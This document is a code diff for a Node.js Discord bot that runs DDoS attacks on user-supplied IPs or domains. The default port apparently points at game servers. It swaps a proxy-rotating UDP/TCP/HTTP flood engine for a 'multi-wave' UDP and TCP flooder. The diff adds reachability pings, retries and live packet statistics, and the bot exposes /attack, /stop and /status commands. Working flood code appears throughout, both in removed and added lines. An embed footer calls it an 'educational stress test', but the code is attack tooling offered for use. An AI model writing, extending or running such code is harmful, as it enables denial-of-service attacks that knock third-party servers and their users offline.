@@ -1,18 +1,14 @@
 // ===================================================================
-// ULTRA DDoS BOT – FAIL-FAST + PROXY ROTATION + MULTI-FLOOD
+// FINAL DDoS BOT – TCP PING + MULTI-WAVE + REALTIME STATS
 // ===================================================================
 require('dotenv').config();
 const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, PermissionsBitField } = require('discord.js');
 const { spawn } = require('child_process');
 const net = require('net');
 const dgram = require('dgram');
-const dns = require('dns').promises;
-const fetch = require('node-fetch');
+const dns = require('dns');
 const express = require('express');
 const http = require('http');
-const { SocksProxyAgent } = require('socks-proxy-agent');
-const { HttpProxyAgent } = require('http-proxy-agent');
-const { HttpsProxyAgent } = require('https-proxy-agent');
 
 // ---------- GLOBALS ----------
 const client = new Client({
@@ -29,38 +25,6 @@ let attackCounter = 0;
 const LOG_CHANNEL = process.env.LOG_CHANNEL_ID;
 const OWNER = process.env.OWNER_ID;
 const spinner = ['|', '/', '-', '\\'];
-let proxyList = []; // Will be populated on startup
-
-// ---------- PROXY FETCHER (runs every 10 mins) ----------
-async function fetchProxies() {
-  try {
-    const url = process.env.PROXY_LIST_URL || 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all';
-    const response = await fetch(url, { timeout: 5000 });
-    const text = await response.text();
-    const lines = text.split('\n').filter(line => line.trim() !== '');
-    const proxies = lines.map(line => {
-      const [ip, port] = line.split(':');
-      if (ip && port) return { ip, port: parseInt(port), type: 'socks5' };
-      return null;
-    }).filter(p => p !== null && p.port > 0);
-    if (proxies.length > 0) {
-      proxyList = proxies;
-      console.log(`✅ Loaded ${proxyList.length} proxies`);
-    } else {
-      console.warn('⚠️ No proxies fetched, using direct connections');
-    }
-  } catch (err) {
-    console.error('Proxy fetch failed:', err.message);
-  }
-}
-fetchProxies();
-setInterval(fetchProxies, 10 * 60 * 1000); // refresh every 10 mins
-
-function getRandomProxy() {
-  if (proxyList.length === 0) return null;
-  const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
-  return proxy;
-}
 
 // ---------- UTILITY FUNCTIONS ----------
 function generatePayload(size) {
@@ -77,127 +41,79 @@ function isValidIP(ip) {
   return ipv4Regex.test(ip);
 }
 
-async function resolveDomainToIP(host) {
-  try {
-    const result = await dns.lookup(host);
-    if (result && result.address) return result.address;
-  } catch (e) {
-    try {
-      const response = await fetch(`https://cloudflare-dns.com/dns-query?name=${host}&type=A`, {
-        headers: { 'Accept': 'application/dns-json' },
-        timeout: 3000
-      });
-      const data = await response.json();
-      if (data.Answer && data.Answer.length > 0) {
-        const ipRecord = data.Answer.find(rec => rec.type === 1);
-        if (ipRecord) return ipRecord.data;
-      }
-    } catch (e2) {
-      return new Promise((resolve) => {
-        const nslookup = spawn('nslookup', [host]);
-        let output = '';
-        nslookup.stdout.on('data', (data) => { output += data.toString(); });
-        nslookup.on('close', () => {
-          const match = output.match(/Address:\s*(\d+\.\d+\.\d+\.\d+)/);
-          if (match && match[1]) resolve(match[1]);
-          else resolve(null);
-        });
-      });
-    }
-  }
-  return null;
-}
-
-// ---------- FAIL-FAST SERVER DETAILS FETCHER ----------
-async function fetchServerDetailsWithTimeout(ip, port, timeoutMs = 2000) {
-  const infoUrl = `http://${ip}:${port}/info.json`;
-  const playersUrl = `http://${ip}:${port}/players.json`;
-
-  // Create abort controllers for each fetch
-  const controller1 = new AbortController();
-  const controller2 = new AbortController();
-  const timeout1 = setTimeout(() => controller1.abort(), timeoutMs);
-  const timeout2 = setTimeout(() => controller2.abort(), timeoutMs);
-
-  try {
-    // Race each fetch against a manual timeout
-    const fetchInfo = fetch(infoUrl, { signal: controller1.signal, timeout: timeoutMs })
-      .then(res => res.ok ? res.json() : null)
-      .catch(() => null);
-    const fetchPlayers = fetch(playersUrl, { signal: controller2.signal, timeout: timeoutMs })
-      .then(res => res.ok ? res.json() : null)
-      .catch(() => null);
-
-    const [info, players] = await Promise.all([fetchInfo, fetchPlayers]);
-
-    clearTimeout(timeout1);
-    clearTimeout(timeout2);
-
-    if (!info && !players) {
-      return null; // Both failed
-    }
-
-    // Calculate ping using TCP handshake with its own timeout
-    const ping = await measurePingWithTimeout(ip, port, 1500);
-
-    return {
-      name: info?.project || info?.Project || 'Unknown',
-      gametype: info?.gametype || info?.GameType || 'Unknown',
-      map: info?.mapname || info?.MapName || 'Unknown',
-      players: Array.isArray(players) ? players.length : (info?.players ? info.players.length : 0),
-      maxPlayers: info?.players ? info.players.length : 0,
-      ping: ping,
-      uptime: info?.uptime ? formatUptime(info.uptime) : 'N/A'
-    };
-  } catch (err) {
-    clearTimeout(timeout1);
-    clearTimeout(timeout2);
-    return null;
-  }
-}
-
-function measurePingWithTimeout(ip, port, timeoutMs) {
+// ---------- DNS RESOLVE WITH TIMEOUT ----------
+function resolveDomainWithTimeout(host, timeoutMs = 2000) {
   return new Promise((resolve) => {
-    const start = Date.now();
-    const socket = new net.Socket();
-    socket.setTimeout(timeoutMs);
-    socket.connect(port, ip, () => {
-      const latency = Date.now() - start;
-      socket.destroy();
-      resolve(latency);
+    let resolved = false;
+    const timer = setTimeout(() => {
+      if (!resolved) resolve(null);
+    }, timeoutMs);
+
+    dns.lookup(host, (err, address) => {
+      if (!resolved) {
+        resolved = true;
+        clearTimeout(timer);
+        if (err) resolve(null);
+        else resolve(address);
+      }
     });
-    socket.on('error', () => { socket.destroy(); resolve('N/A'); });
-    socket.on('timeout', () => { socket.destroy(); resolve('N/A'); });
   });
 }
 
-function formatUptime(seconds) {
-  const days = Math.floor(seconds / 86400);
-  const hours = Math.floor((seconds % 86400) / 3600);
-  const minutes = Math.floor((seconds % 3600) / 60);
-  return `${days}d ${hours}h ${minutes}m`;
+// ---------- TCP PING (HALF-OPEN SYN SCAN) ----------
+function tcpPing(ip, port, timeoutMs = 1000) {
+  return new Promise((resolve) => {
+    const socket = new net.Socket();
+    let resolved = false;
+    const timer = setTimeout(() => {
+      if (!resolved) {
+        resolved = true;
+        socket.destroy();
+        resolve(false);
+      }
+    }, timeoutMs);
+
+    socket.connect(port, ip, () => {
+      if (!resolved) {
+        resolved = true;
+        clearTimeout(timer);
+        socket.destroy();
+        resolve(true);
+      }
+    });
+
+    socket.on('error', () => {
+      if (!resolved) {
+        resolved = true;
+        clearTimeout(timer);
+        socket.destroy();
+        resolve(false);
+      }
+    });
+  });
 }
 
-// ---------- ULTRA FLOOD ENGINE (MULTI-PROTOCOL + PROXY) ----------
-function launchFlooder(targetIP, targetPort, durationSeconds, packetSize, threads = 20, useProxies = true) {
+// ---------- MULTI-WAVE FLOOD ENGINE ----------
+function launchFlooder(targetIP, targetPort, durationSeconds, packetSize, threads = 30) {
   return new Promise((resolve, reject) => {
-    // Pass proxy list as JSON to child process
-    const proxyJson = useProxies ? JSON.stringify(proxyList.slice(0, 50)) : '[]';
+    // Calculate wave timings: burst (first 10%), sustain (middle 80%), spike (last 10%)
+    const burstDuration = Math.floor(durationSeconds * 0.1);
+    const sustainDuration = Math.floor(durationSeconds * 0.8);
+    const spikeDuration = durationSeconds - burstDuration - sustainDuration;
     
     const flooder = spawn('node', [
       '-e',
       `
         const net = require('net');
         const dgram = require('dgram');
-        const http = require('http');
-        const https = require('https');
-        const { SocksProxyAgent } = require('socks-proxy-agent');
         const target = '${targetIP}';
         const port = ${targetPort};
-        const duration = ${durationSeconds} * 1000;
+        const totalDuration = ${durationSeconds} * 1000;
         const size = ${packetSize};
         const threads = ${threads};
-        const proxies = ${proxyJson};
+        const burstMs = ${burstDuration} * 1000;
+        const sustainMs = ${sustainDuration} * 1000;
+        const spikeMs = ${spikeDuration} * 1000;
 
         function generatePayload(s) {
           let p = '';
@@ -205,98 +121,110 @@ function launchFlooder(targetIP, targetPort, durationSeconds, packetSize, thread
           return p;
         }
 
-        // --- UDP Flood (with optional proxy) ---
-        function udpFlood(proxy) {
+        let totalPackets = 0;
+        let totalBytes = 0;
+        let activeConnections = 0;
+        let isRunning = true;
+
+        // UDP flood function
+        function udpFlood(duration, intensity) {
           const sock = dgram.createSocket('udp4');
           const payload = generatePayload(size);
-          let start = Date.now();
+          const start = Date.now();
           let sent = 0;
-          while (Date.now() - start < duration) {
+          while (isRunning && (Date.now() - start < duration)) {
             sock.send(payload, 0, payload.length, port, target, (err) => {});
             sent++;
-            if (sent % 1000 === 0) setImmediate(() => {});
+            totalPackets++;
+            totalBytes += payload.length;
+            if (sent % (100 * intensity) === 0) setImmediate(() => {});
           }
           sock.close();
         }
 
-        // --- TCP SYN Flood (raw socket approximation) ---
-        function tcpFlood(proxy) {
+        // TCP flood function
+        function tcpFlood(duration, intensity) {
           const payload = generatePayload(size);
-          let start = Date.now();
+          const start = Date.now();
           let connections = 0;
-          while (Date.now() - start < duration) {
+          while (isRunning && (Date.now() - start < duration)) {
             const client = new net.Socket();
             client.connect(port, target, () => {
               client.write(payload);
-              connections++;
+              activeConnections++;
             });
             client.on('error', () => {});
-            setTimeout(() => { client.destroy(); }, 50);
-            if (connections % 500 === 0) setImmediate(() => {});
+            setTimeout(() => { 
+              client.destroy();
+              activeConnections--;
+            }, 50);
+            connections++;
+            if (connections % (50 * intensity) === 0) setImmediate(() => {});
           }
         }
 
-        // --- HTTP Request Storm ---
-        function httpFlood(proxy) {
-          const agent = proxy ? new SocksProxyAgent(proxy) : null;
-          const options = {
-            hostname: target,
-            port: port,
-            path: '/',
-            method: 'GET',
-            headers: {
-              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-              'Connection': 'keep-alive',
-              'Cache-Control': 'no-cache'
-            },
-            agent: agent
-          };
-          let start = Date.now();
-          let requests = 0;
-          while (Date.now() - start < duration) {
-            const req = http.request(options, (res) => {});
-            req.on('error', () => {});
-            req.end();
-            requests++;
-            if (requests % 100 === 0) setImmediate(() => {});
+        // Launch waves
+        function launchWave(duration, intensity) {
+          const udpThreads = Math.ceil(threads * 0.6);
+          const tcpThreads = Math.floor(threads * 0.4);
+          for (let i = 0; i < udpThreads; i++) {
+            setTimeout(() => udpFlood(duration, intensity), i * 5);
+          }
+          for (let i = 0; i < tcpThreads; i++) {
+            setTimeout(() => tcpFlood(duration, intensity), i * 5);
           }
         }
 
-        // --- ICMP-style Flood (using UDP with spoofed payloads) ---
-        function icmpFlood(proxy) {
-          const sock = dgram.createSocket('udp4');
-          const payload = Buffer.from([0x08, 0x00, 0x00, 0x00, ...Array.from(generatePayload(32))]);
-          let start = Date.now();
-          let sent = 0;
-          while (Date.now() - start < duration) {
-            sock.send(payload, 0, payload.length, port, target, (err) => {});
-            sent++;
-            if (sent % 500 === 0) setImmediate(() => {});
-          }
-          sock.close();
-        }
-
-        // Launch threads with proxy rotation
-        const floodTypes = [udpFlood, tcpFlood, httpFlood, icmpFlood];
-        for (let i = 0; i < threads; i++) {
-          const floodFn = floodTypes[i % floodTypes.length];
-          const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
-          const proxyStr = proxy ? \`socks5://\${proxy.ip}:\${proxy.port}\` : null;
-          setTimeout(() => floodFn(proxyStr), i * 5);
-        }
-
+        // Wave 1: Burst (high intensity)
+        launchWave(burstMs, 3);
+        
+        // Wave 2: Sustain (medium intensity)
         setTimeout(() => {
+          launchWave(sustainMs, 1.5);
+        }, burstMs);
+        
+        // Wave 3: Spike (very high intensity)
+        setTimeout(() => {
+          launchWave(spikeMs, 5);
+        }, burstMs + sustainMs);
+
+        // Log stats every 5 seconds to stdout
+        const statsInterval = setInterval(() => {
+          console.log(\`STATS: packets=\${totalPackets}, bytes=\${totalBytes}, conns=\${activeConnections}\`);
+        }, 5000);
+
+        // Stop everything after total duration
+        setTimeout(() => {
+          isRunning = false;
+          clearInterval(statsInterval);
           process.exit(0);
-        }, duration + 5000);
+        }, totalDuration + 2000);
       `
     ], { stdio: ['ignore', 'pipe', 'pipe'] });
 
-    let output = '';
-    flooder.stdout.on('data', (data) => { output += data.toString(); });
-    flooder.stderr.on('data', (data) => { output += data.toString(); });
+    let statsOutput = '';
+    flooder.stdout.on('data', (data) => {
+      const str = data.toString();
+      statsOutput += str;
+      // Parse stats for real-time updates
+      const match = str.match(/STATS: packets=(\d+), bytes=(\d+), conns=(\d+)/);
+      if (match) {
+        const [_, packets, bytes, conns] = match;
+        // Store latest stats in a global variable for the status command
+        if (global._attackStats) {
+          global._attackStats.packets = parseInt(packets);
+          global._attackStats.bytes = parseInt(bytes);
+          global._attackStats.conns = parseInt(conns);
+        }
+      }
+    });
+
+    flooder.stderr.on('data', (data) => {
+      // Ignore errors – we want the flood to continue
+    });
 
     flooder.on('close', (code) => {
-      resolve({ code, output });
+      resolve({ code, output: statsOutput });
     });
 
     flooder.on('error', (err) => {
@@ -318,7 +246,7 @@ async function registerCommands() {
   const commands = [
     new SlashCommandBuilder()
       .setName('attack')
-      .setDescription('Launch hyper-aggressive DDoS on IP or domain')
+      .setDescription('Launch multi-wave DDoS on IP or domain')
       .addStringOption(option =>
         option.setName('target')
           .setDescription('Target (IP:Port or Domain:Port)')
@@ -336,12 +264,7 @@ async function registerCommands() {
       )
       .addIntegerOption(option =>
         option.setName('threads')
-          .setDescription('Threads (default: 20, max: 100)')
-          .setRequired(false)
-      )
-      .addBooleanOption(option =>
-        option.setName('useproxies')
-          .setDescription('Use proxy rotation? (default: true)')
+          .setDescription('Threads (default: 30, max: 100)')
           .setRequired(false)
       ),
     new SlashCommandBuilder()
@@ -349,7 +272,7 @@ async function registerCommands() {
       .setDescription('Stop your active attack'),
     new SlashCommandBuilder()
       .setName('status')
-      .setDescription('Show all active attacks'),
+      .setDescription('Show active attacks with real-time stats'),
     new SlashCommandBuilder()
       .setName('killall')
       .setDescription('[OWNER] Terminate all attacks')
@@ -384,8 +307,7 @@ client.on('interactionCreate', async interaction => {
     const rawTarget = interaction.options.getString('target');
     const duration = interaction.options.getInteger('duration') || 60;
     const packetSize = interaction.options.getInteger('packetsize') || 1024;
-    const threads = Math.min(interaction.options.getInteger('threads') || 20, 100);
-    const useProxies = interaction.options.getBoolean('useproxies') !== false;
+    const threads = Math.min(interaction.options.getInteger('threads') || 30, 100);
 
     let host, port = 30120;
     if (rawTarget.includes(':')) {
@@ -400,7 +322,7 @@ client.on('interactionCreate', async interaction => {
       return interaction.editReply({ content: '❌ Invalid port range.', ephemeral: true });
     }
 
-    // Resolve domain
+    // --- Resolve domain with timeout ---
     let resolvedIP = host;
     if (!isValidIP(host)) {
       let loadingMsg = await interaction.editReply({ content: `🌐 Resolving \`${host}\`... ${spinner[0]}`, ephemeral: true });
@@ -410,40 +332,24 @@ client.on('interactionCreate', async interaction => {
         await interaction.editReply({ content: `🌐 Resolving \`${host}\`... ${spinner[spinIdx]}`, ephemeral: true });
       }, 2000);
 
-      resolvedIP = await resolveDomainToIP(host);
+      resolvedIP = await resolveDomainWithTimeout(host, 3000);
       clearInterval(interval);
 
       if (!resolvedIP) {
-        return interaction.editReply({ content: `❌ Could not resolve \`${host}\`.`, ephemeral: true });
+        return interaction.editReply({ content: `❌ Could not resolve \`${host}\` within 3 seconds.`, ephemeral: true });
       }
       await interaction.editReply({ content: `✅ Resolved \`${host}\` → \`${resolvedIP}\``, ephemeral: true });
     }
 
-    // Fetch server details WITH FAIL-FAST (2 second timeout)
-    await interaction.editReply({ content: `📡 Fetching server details for \`${resolvedIP}:${port}\`... (timeout: 2s)`, ephemeral: true });
-    let serverInfo = null;
-    try {
-      serverInfo = await fetchServerDetailsWithTimeout(resolvedIP, port, 2000);
-    } catch (err) {
-      // Ignore – we'll skip
-    }
-
+    // --- TCP Ping (1 second timeout) ---
+    await interaction.editReply({ content: `📡 Pinging \`${resolvedIP}:${port}\`...`, ephemeral: true });
+    const isAlive = await tcpPing(resolvedIP, port, 1000);
+    
     let detailsBlock = '';
-    if (serverInfo) {
-      detailsBlock = `
-\`\`\`
-SERVER STATUS
-─────────────────
-Name     : ${serverInfo.name}
-Gametype : ${serverInfo.gametype}
-Map      : ${serverInfo.map}
-Players  : ${serverInfo.players}/${serverInfo.maxPlayers}
-Ping     : ${serverInfo.ping}ms
-Uptime   : ${serverInfo.uptime}
-─────────────────
-\`\`\``;
+    if (isAlive) {
+      detailsBlock = `\`\`\`\n✅ Server is reachable (TCP handshake successful)\nLaunching multi-wave attack...\n\`\`\``;
     } else {
-      detailsBlock = `\`\`\`\n⚠️ Server unreachable – skipping details. Launching attack anyway.\n\`\`\``;
+      detailsBlock = `\`\`\`\n⚠️ Server unreachable (no TCP response)\nAttack will still proceed – UDP may work even if TCP is filtered.\n\`\`\``;
     }
 
     // Check for existing attack
@@ -452,71 +358,111 @@ Uptime   : ${serverInfo.uptime}
       return interaction.editReply({ content: '⚠️ You already have an active attack. Use `/stop`.', ephemeral: true });
     }
 
-    // Launch flooder
-    try {
-      const flooderProcess = await launchFlooder(resolvedIP, port, duration, packetSize, threads, useProxies);
+    // Initialize global stats
+    global._attackStats = { packets: 0, bytes: 0, conns: 0 };
+
+    // --- Launch flooder with retry logic ---
+    let attempts = 0;
+    let flooderProcess = null;
+    let attackLaunched = false;
+
+    while (attempts < 3 && !attackLaunched) {
+      try {
+        flooderProcess = await launchFlooder(resolvedIP, port, duration, packetSize, threads);
+        attackLaunched = true;
+      } catch (err) {
+        attempts++;
+        if (attempts >= 3) {
+          return interaction.editReply({ content: `❌ Failed to launch attack after 3 attempts: ${err.message}`, ephemeral: true });
+        }
+        await interaction.editReply({ content: `⚠️ Attempt ${attempts} failed, retrying...`, ephemeral: true });
+      }
+    }
+
+    if (!attackLaunched || !flooderProcess) {
+      return interaction.editReply({ content: '❌ Critical error: could not launch attack.', ephemeral: true });
+    }
+
+    // Store attack
+    activeAttacks.set(attackKey, {
+      process: flooderProcess,
+      target: rawTarget,
+      resolvedIP: resolvedIP,
+      port: port,
+      duration: duration,
+      startTime: Date.now(),
+      threads: threads,
+      packetSize: packetSize,
+      isAlive: isAlive
+    });
+
+    attackCounter++;
+
+    // --- Send initial attack embed ---
+    const embed = new EmbedBuilder()
+      .setTitle('🔥 MULTI-WAVE ATTACK LAUNCHED')
+      .setColor(0xFF0000)
+      .addFields(
+        { name: 'Target', value: `${rawTarget} → ${resolvedIP}`, inline: false },
+        { name: 'Port', value: `${port}`, inline: true },
+        { name: 'Duration', value: `${duration}s (3 waves)`, inline: true },
+        { name: 'Threads', value: `${threads}`, inline: true },
+        { name: 'Packet Size', value: `${packetSize} bytes`, inline: true },
+        { name: 'Reachable', value: isAlive ? '✅ Yes' : '⚠️ No (UDP may still work)', inline: true },
+        { name: 'Initiated By', value: `<@${user.id}>`, inline: true },
+        { name: 'Attack ID', value: `#${attackCounter}`, inline: true }
+      )
+      .setDescription(detailsBlock)
+      .setTimestamp()
+      .setFooter({ text: 'Educational stress test – traffic generation only' });
+
+    const logChannel = client.channels.cache.get(LOG_CHANNEL);
+    if (logChannel) await logChannel.send({ embeds: [embed] });
+
+    // --- Real-time updates ---
+    let updateMsg = await interaction.editReply({
+      content: `✅ **ATTACK LIVE** - ${rawTarget} (${resolvedIP}:${port})\n⏱️ Elapsed: 0s / ${duration}s\n📦 Packets: 0\n📊 Connections: 0\n💾 Data: 0 MB`,
+      ephemeral: true
+    });
+
+    const startTime = Date.now();
+    const updateInterval = setInterval(async () => {
+      const elapsed = Math.floor((Date.now() - startTime) / 1000);
+      const remaining = Math.max(duration - elapsed, 0);
+      const stats = global._attackStats || { packets: 0, bytes: 0, conns: 0 };
+      const mb = (stats.bytes / (1024 * 1024)).toFixed(2);
       
-      activeAttacks.set(attackKey, {
-        process: flooderProcess,
-        target: rawTarget,
-        resolvedIP: resolvedIP,
-        port: port,
-        duration: duration,
-        startTime: Date.now(),
-        threads: threads,
-        packetSize: packetSize,
-        useProxies: useProxies
-      });
-
-      attackCounter++;
-
-      const embed = new EmbedBuilder()
-        .setTitle('🔥 ULTRA ATTACK LAUNCHED')
-        .setColor(0xFF0000)
-        .addFields(
-          { name: 'Target', value: `${rawTarget} → ${resolvedIP}`, inline: false },
-          { name: 'Port', value: `${port}`, inline: true },
-          { name: 'Duration', value: `${duration}s`, inline: true },
-          { name: 'Threads', value: `${threads}`, inline: true },
-          { name: 'Packet Size', value: `${packetSize} bytes`, inline: true },
-          { name: 'Proxies', value: useProxies ? `${proxyList.length} loaded` : 'Disabled', inline: true },
-          { name: 'Initiated By', value: `<@${user.id}>`, inline: true },
-          { name: 'Attack ID', value: `#${attackCounter}`, inline: true }
-        )
-        .setDescription(detailsBlock)
-        .setTimestamp()
-        .setFooter({ text: 'Educational stress test – traffic generation only' });
-
-      const logChannel = client.channels.cache.get(LOG_CHANNEL);
-      if (logChannel) await logChannel.send({ embeds: [embed] });
-
       await interaction.editReply({
-        content: `✅ **MASSIVE ATTACK** launched against **${rawTarget}** (${resolvedIP}:${port}) for **${duration}s** with **${threads}** threads & ${useProxies ? 'proxy rotation' : 'direct'}.\nUse \`/stop\` to halt.`,
+        content: `✅ **ATTACK LIVE** - ${rawTarget} (${resolvedIP}:${port})\n⏱️ Elapsed: ${elapsed}s / ${duration}s | Remaining: ${remaining}s\n📦 Packets: ${stats.packets.toLocaleString()}\n📊 Connections: ${stats.conns}\n💾 Data: ${mb} MB\n🧵 Threads: ${threads}`,
         ephemeral: true
       });
+    }, 5000);
 
-      // Auto-expire
-      setTimeout(() => {
-        if (activeAttacks.has(attackKey)) {
-          activeAttacks.delete(attackKey);
-          const doneEmbed = new EmbedBuilder()
-            .setTitle('⏹️ ATTACK COMPLETED')
-            .setColor(0x00FF00)
-            .addFields(
-              { name: 'Target', value: `${rawTarget}`, inline: true },
-              { name: 'Duration', value: `${duration}s`, inline: true },
-              { name: 'Attack ID', value: `#${attackCounter}`, inline: true }
-            )
-            .setTimestamp();
-          if (logChannel) logChannel.send({ embeds: [doneEmbed] });
-        }
-      }, duration * 1000 + 3000);
+    // Auto-expire after duration
+    setTimeout(() => {
+      clearInterval(updateInterval);
+      if (activeAttacks.has(attackKey)) {
+        activeAttacks.delete(attackKey);
+        const doneEmbed = new EmbedBuilder()
+          .setTitle('⏹️ ATTACK COMPLETED')
+          .setColor(0x00FF00)
+          .addFields(
+            { name: 'Target', value: `${rawTarget}`, inline: true },
+            { name: 'Duration', value: `${duration}s`, inline: true },
+            { name: 'Attack ID', value: `#${attackCounter}`, inline: true },
+            { name: 'Total Packets', value: `${(global._attackStats?.packets || 0).toLocaleString()}`, inline: true },
+            { name: 'Total Data', value: `${((global._attackStats?.bytes || 0) / (1024 * 1024)).toFixed(2)} MB`, inline: true }
+          )
+          .setTimestamp();
+        if (logChannel) logChannel.send({ embeds: [doneEmbed] });
+        interaction.editReply({
+          content: `⏹️ Attack on ${rawTarget} completed. Total packets: ${(global._attackStats?.packets || 0).toLocaleString()}`,
+          ephemeral: true
+        }).catch(() => {});
+      }
+    }, duration * 1000 + 3000);
 
-    } catch (err) {
-      console.error(err);
-      await interaction.editReply({ content: `❌ Attack failed: ${err.message}`, ephemeral: true });
-    }
-  }
+  } // end /attack
 
   else if (commandName === 'stop') {
     await interaction.deferReply({ ephemeral: true });
@@ -540,15 +486,15 @@ Uptime   : ${serverInfo.uptime}
       return interaction.editReply({ content: '📊 No active attacks.', ephemeral: true });
     }
     let table = '📊 **ACTIVE ATTACKS**\n```\n';
-    table += 'ID  | Target                  | Port | Elapsed | Remaining | Threads | Proxies\n';
+    table += 'ID  | Target                  | Port | Elapsed | Remaining | Threads | Packets\n';
     table += '----|-------------------------|------|---------|-----------|---------|--------\n';
     let idx = 1;
     for (const [key, attack] of activeAttacks) {
       const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
       const remaining = Math.max(attack.duration - elapsed, 0);
       const targetStr = attack.target.length > 20 ? attack.target.substring(0, 17) + '...' : attack.target.padEnd(20);
-      const proxyStr = attack.useProxies ? '✅' : '❌';
-      table += `${String(idx).padStart(2)}  | ${targetStr} | ${String(attack.port).padStart(4)} | ${String(elapsed).padStart(7)}s | ${String(remaining).padStart(9)}s | ${String(attack.threads).padStart(7)} | ${proxyStr}\n`;
+      const packets = global._attackStats?.packets || 0;
+      table += `${String(idx).padStart(2)}  | ${targetStr} | ${String(attack.port).padStart(4)} | ${String(elapsed).padStart(7)}s | ${String(remaining).padStart(9)}s | ${String(attack.threads).padStart(7)} | ${String(packets).padStart(7)}\n`;
       idx++;
     }
     table += '```';
@@ -574,13 +520,13 @@ const app = express();
 app.get('/', (req, res) => {
   res.send(`
     <html>
-      <head><title>Ultra DDoS Bot</title></head>
+      <head><title>Ultimate DDoS Bot</title></head>
       <body style="background:#0a0a0a;color:#00ff00;font-family:monospace;">
-        <h1>⚡ ULTRA ATTACK ENGINE</h1>
+        <h1>⚡ ULTIMATE ATTACK ENGINE</h1>
         <p>Active Attacks: ${activeAttacks.size}</p>
         <p>Total Launched: ${attackCounter}</p>
-        <p>Proxies: ${proxyList.length}</p>
         <p>Uptime: ${process.uptime().toFixed(2)}s</p>
+        <p>Global Packets: ${(global._attackStats?.packets || 0).toLocaleString()}</p>
         <pre>${JSON.stringify(Array.from(activeAttacks.entries()).map(([k,v]) => ({ user: k, target: v.target, port: v.port, elapsed: Math.floor((Date.now()-v.startTime)/1000) })), null, 2)}</pre>
       </body>
     </html>
